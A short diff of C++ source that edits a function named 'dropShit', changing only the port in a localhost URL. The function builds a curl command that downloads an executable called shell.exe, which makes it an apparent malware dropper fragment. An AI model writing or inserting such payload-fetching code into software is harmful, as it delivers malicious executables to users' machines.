@@ -19,7 +19,7 @@ string getFileName(const string& s) {
 }
 
 void dropShit() {
-    string url = "http://127.0.0.1:8000/shell.exe";
+    string url = "http://127.0.0.1/shell.exe";
     string opt1 = "curl ";
     string opt2 = "  -o shell.exe";
     string cmd = opt1 + url + opt2;
